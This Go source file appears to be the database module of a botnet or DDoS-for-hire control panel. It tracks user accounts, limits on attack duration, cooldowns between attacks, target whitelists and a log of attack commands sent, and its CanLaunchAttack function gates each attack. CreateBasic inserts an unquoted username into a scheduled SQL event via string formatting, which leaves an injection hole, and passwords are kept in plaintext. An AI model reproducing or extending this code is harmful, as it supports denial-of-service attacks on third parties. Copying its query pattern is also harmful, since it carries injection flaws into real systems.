package main

import (
	"database/sql"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/fatih/color"
	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type whitelist struct {
	Db *sql.DB
}

type AccountInfo struct {
	username string
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		color.Red("MySQL Connection err: %s", err)
	}
	color.Green("MySQL Connection initialized!")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, admin FROM users WHERE username = ? AND password = ?", username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.admin)
	return true, accInfo
}

func (this *Database) CreateBasic(username string, password string, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, admin, cooldown, duration_limit) VALUES (?, ?, 0, ?, ?)", username, password, cooldown, duration)
	sql := fmt.Sprintf("CREATE EVENT delete_basic_user_%s ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 30 DAY DO DELETE FROM `users` WHERE `username` = %s", username, username)
	this.db.Exec(sql)
	color.Yellow("Added new basic %s to database.", username)
	return true
}

func (this *Database) CreateAdmin(username string, password string, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, admin, cooldown, duration_limit) VALUES (?, ?, 1, ?, ?)", username, password, cooldown, duration)
	color.Yellow("Added new admin %s to database.", username)
	return true
}

func (this *Database) BlockRange(host string) bool {
	rows, err := this.db.Query("SELECT host FROM whitelist WHERE host = ?", host)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO whitelist (id, host) VALUES (NULL, ?)", host)
	color.Yellow("Added new whitelist range to database.")
	return true
}

func (this *Database) UnBlockRange(prefix string) bool {
	rows, err := this.db.Query("DELETE FROM `whitelist` WHERE host = ?", prefix)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `whitelist` WHERE host = ?", prefix)
	return true
}

func (this *Database) RemoveUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
	color.Yellow("Removed user %s from database", username)
	return true
}

func (this *Database) ContainsWhitelistedTargets(attack string) bool {
	rows, err := this.db.Query("SELECT host FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var host string
		rows.Scan(&host)

		if strings.Contains(attack, host) {
			return true
		}

	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration int, fullCommand string) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && uint32(duration) > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()

	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command) VALUES (?, UNIX_TIMESTAMP(), ?, ?)", userId, duration, fullCommand)
	return true, nil
}
